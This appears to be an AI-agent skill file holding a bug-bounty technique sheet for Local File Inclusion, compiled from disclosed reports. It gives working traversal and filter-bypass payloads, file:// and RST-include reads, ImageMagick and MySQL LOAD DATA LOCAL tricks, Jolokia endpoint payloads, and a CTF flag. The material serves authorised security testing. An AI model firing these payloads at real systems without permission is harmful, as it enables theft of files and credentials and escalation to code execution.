---
name: hunter-l3-lfi
description: "Use when hunting LFI on a target. Loads the L3 technique sheet: Local File Inclusion / arbitrary file read is a class where user-controlled input reaches a filesystem read primitive (file_get_contents, include, download handlers, image pipelines, or JVM diagnostic commands) without path normalization."
domain: cybersecurity
subdomain: web
tags:
- web
- lfi
- hunting
- l3
version: '1.0'
---

# LFI — Technique Sheet

## Overview
Local File Inclusion / arbitrary file read is a class where user-controlled input reaches a filesystem read primitive (file_get_contents, include, download handlers, image pipelines, or JVM diagnostic commands) without path normalization. It pays when you can prove a read of sensitive files (/etc/passwd, source code, configs, credentials in logs), and it chains upward — read source to find more bugs, or pivot a traversal into RCE via attacker-writable PHP templates. The records below cluster into five actionable sub-patterns: single-pass blacklist bypass, plain traversal on download/include params, path control via URL schemes and headers, exploitation of exposed infra endpoints (Jolokia, WebLogic), and file reads via client-side protocols (LOAD DATA LOCAL, ImageMagick).

## Distinct sub-patterns

### 1. Single-pass str_replace blacklist bypass (nested self-repairing filename)
This is by far the densest pattern in the records (11+ reports, all on a `template` param on a `/my-diary` page).

- Endpoint shape: `GET /my-diary/?template={filename}` (also seen without trailing slash: `GET /my-diary`)
- Payload that fired (verbatim variants — all collapse to `secretadmin.php` after filtering):
  - `template=secretadminsecretadminadmin.php.php.php`
  - `template=secretsecretadmin.phpadminadmin.php.phpadminadmin.php.php`
  - `secretasecretadmadmin.phpin.phpdmin.php`
  - `secretsecretadadmin.phpmin.phpadadmin.phpmin.php`
  - `secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php`
  - `secretadsecretadminadmin.php.phpmin.php`
  - `secretadmsecretadmadmin.phpin.phpin.php`
  - `secretadsecretaadmin.phpdmin.phpmin.php`
  - `secretadmisecretaadmin.phpdmin.phpn.php`
  - `secretadmsecretadadmin.phpmin.phpin.php`
- Root cause: the code does `file_get_contents($page)` after `str_replace(['admin.php','secretadmin.php'], '', $input)` — a non-recursive, single-pass replacement. A payload built from interleaved fragments of the target re-forms the target filename once the filter strips the first occurrence of each banned substring.
- Impact: read the source of the IP-protected `secretadmin.php`, disclosing the flag `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}` (day-6 CTF flag).
- Exemplars: 1065731 (h1-ctf), 1066504 (Stripe), 1069039 (Reddit).

### 2. Classic `../` traversal on download/include parameters
- Endpoint shapes and payloads that fired:
  - `GET /download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd` — prefix with a valid externally-facing directory (`data_products/MISC/frida_cal/`), then append the traversal to escape it (1639364, U.S. Dept Of Defense). Impact: arbitrary file download on a .mil host, /etc/passwd retrieved.
  - `GET /{path}` with payload `../../../../etc/passwd` — unauthenticated LFI on Slack, disclosing local PHP files and logs; tokens inadvertently logged were revoked as a precaution (272578, Slack).
  - URI handler on `www.starbucks.co.kr` with `../../../../etc/passwd` — traversed the docroot; only non-sensitive resources were reachable, so lower severity (844067, Starbucks).
  - `POST /phame/blog/new/` with param `skin=../../../../../../../../../../tmp/test` — Phabricator Phame blog skin path not validated to stay inside the skins root. Loaded attacker-supplied header.php from /tmp, whose payload `phpinfo()` executed → **RCE**, not just read (39428, Phabricator). This is the highest-impact traversal in the records.
- Root cause: parameter concatenated into a file path with no traversal sanitization or realpath/jail check.

### 3. URL-encoded traversal with an appended extension (`..%2f`)
- Endpoint shape: `GET /dashboard/Docs/index/{page}` (GSA Bounty, two reports)
- Payloads: `..%2fREADME` (895972) and full URL `https://labs.data.gov/dashboard/Docs/index/..%2fREADME` (895696)
- Root cause: `file_get_contents($docs_path . $page . '.md')` with zero sanitization. The `.md` suffix is appended automatically, which normally limits reads to Markdown files — the traversal escapes the docs dir but keeps the extension.
- Impact: read `README.md` from `/var/www/dashboard/new/`, outside the intended public docs dir.
- Note: the target file must end in `.md`; this constrains but does not eliminate impact.

### 4. Path control via URL scheme or HTTP headers
- **`file://` scheme via base64 (Evernote, 1189367):** `GET https://www.evernote.com/ro/{base64}/{num}.js` where base64 encodes `file:///home/abenavides/#.js`. The same fetch endpoint that handled remote URLs accepted the `file://` scheme. Impact: directory listing of `/home/abenavides/` and `/etc/passwd` contents from the webserver. Chain: base64-encode `file:///etc/passwd#.js` → request `/ro/<b64>/-1430533899.js` → contents returned.
- **`X-Original-URL` header (Concrete CMS, 596657→59665):** dispatcher used `Request::getPathInfo()`, which is controllable via headers; payload `../../../../../../etc/passwd` in the original-URL path gave LFI. Payload largely not stated beyond the traversal fragment.
- **RST `include::` directive (Paragon, 179034):** RST parser had the `include` directive enabled; payload `.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts` rendered /etc/hosts into the HTML output. Note this is reStructuredText syntax, not a URL param.

### 5. Image / client-protocol file reads
- **ImageMagick CVE-2022-44268 (HackerOne, 1858574):** `POST /profile` avatar upload with a crafted PNG (`im-lfi.png`). The server-side resize pipeline ran a vulnerable ImageMagick that reads a file referenced inside the PNG and embeds its hex-encoded contents in the resized image's `tEXt` profile. Impact: hex-encoded /etc/passwd extracted from the processed avatar on hackerone.com (decoded showed `',,,:/run/systemd:/usr/sbin/nologin'`).
- **MySQL `LOAD DATA LOCAL` (Infogram, 719875):** the app's MySQL connection accepted arbitrary SQL; payload `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\n"` against an attacker-controlled MySQL server read /etc/passwd and /etc/hosts from Infogram's server (captured in network traffic). Chain: stand up evil MySQL server with matching DB/table → point the app's connection at it → issue the LOAD DATA statement.

### 6. Exposed JVM / middleware management endpoints
- **Jolokia `compilerDirectivesAdd`:**
  - 2778380 (DoD): `GET /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/` with payload `!/etc!/passwd` — the `!` separator traverses directories; read /etc/passwd and /etc/crontab unauthenticated.
  - 1641661 (8x8): same MBean via Spring actuator, payload path `!/etc!/hostname` on `:1293/actuator/jolokia/exec/.../compilerDirectivesAdd` — read /etc/hostname on an exposed acceptance host.
- **WebLogic CVE-2022-21371 (Mars, 2387600):** unauthenticated LFI in the Web Container of Oracle WebLogic. Payload not stated in the record; program-confirmed impact up to "access to sensitive data or the entire data store … up to complete control of the server." Hunt shape: unauthenticated WebLogic HTTP endpoints tested for known LFI CVEs.
- Two additional DoD reports (183978, 196448) describe "misconfigured website allows arbitrary local file download via crafted URL" but provide no endpoint or payload — treat as confirmation this shape pays on .gov/.mil scope even without detail.

## Bypass / chain notes
- **Blacklist filters are single-pass.** `str_replace(['x','y'], '', $s)` does not re-scan. Any payload where removing the first occurrences of each banned substring reconstructs the target survives. General recipe: interleave fragments of the target string so stripping banned tokens "repairs" it. Over a dozen distinct working strings existed for one two-token filter — the space is large; construct yours mechanically rather than copying.
- **Read the filter first.** Multiple chains started with `?template=index.php` to read the source and see the exact str_replace list before crafting the bypass (1066203, 1066504, 1069189). LFI → source disclosure → better LFI is the standard escalation loop.
- **Prefix a valid directory when a base path is enforced:** `data_products/MISC/frida_cal/` + traversal (1639364). When an extension is auto-appended (`.md`, `.js`, `.php`), plan the target filename around it — `..%2fREADME` to hit `README.md` (895696/895972).
- **Traversal → RCE** when the included path points to attacker-controllable content: Phabricator skin → /tmp header.php → `phpinfo()` execution (39428). Look for include-type sinks (templates, skins, locales) not just read/download params.
- **When direct traversal is blocked, move to a different read primitive:** `file://` scheme via a fetch proxy endpoint (Evernote), RST include directive (Paragon), ImageMagick profile (HackerOne), or client-side MySQL reads (Infogram).

## Gotchas / what NOT to do
- Recursive-looking payloads only work because the filter is non-recursive. If the code used `while (strpos(...))` or a proper normalizer, these nested strings do nothing — confirm the sink before assuming.
- Non-recursive payloads are fragile to filter order. Some records show filters applied sequentially (`admin.php` then `secretadmin.php`); test against the actual order read from source.
- Not every traversal is high severity. Starbucks (844067) could only reach non-sensitive resources — no sensitive files read, no bounty-worthy escalation. Prove a sensitive read (/etc/passwd, source, configs) or expect downgrade.
- Auto-appended extensions constrain you. `.md`-only reads (GSA) won't get you /etc/passwd; hunt for .md files outside the docroot instead.
- Don't stop at /etc/passwd on structured services: Slack's disclosure included **logged tokens**, which forced revocation — that's the impact that matters, not the passwd line itself.
- Known-CVE infra findings (WebLogic CVE-2022-21371, ImageMagick CVE-2022-44268) still need a version check and a harmless proof of read; do not push beyond program-disclosed scope (the 8x8 report explicitly limited impact to what the program allowed).
- The my-diary cluster shows many hunters duplicating one finding against different programs — same bug, many reports. On CTFs/copycat targets, speed wins; on real programs, avoid re-reporting known duplicates.

## Real-world impact examples
- Slack (272578): unauthenticated LFI disclosed local PHP files and logs; logged tokens revoked as precaution.
- Phabricator (39428): skin traversal → attacker-supplied header.php executed `phpinfo()` — full RCE.
- HackerOne (1858574): crafted avatar PNG caused production ImageMagick to embed /etc/passwd hex into the served image on hackerone.com.
- Evernote (1189367): `file://` in the /ro fetch endpoint leaked a home-directory listing and /etc/passwd from the webserver.
- Infogram (719875): malicious MySQL server exfiltrated /etc/passwd and /etc/hosts from Infogram's production server.
- DoD .mil (1639364): arbitrary file download on a .mil host via one traversal parameter.
- GSA (895696/895972): out-of-docroot reads via `..%2f` on an auto-appending include sink.
- CTF (h1-ctf cluster): flag `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}` from `secretadmin.php`, demonstrated by 11+ independent str_replace bypass payloads on `?template=`.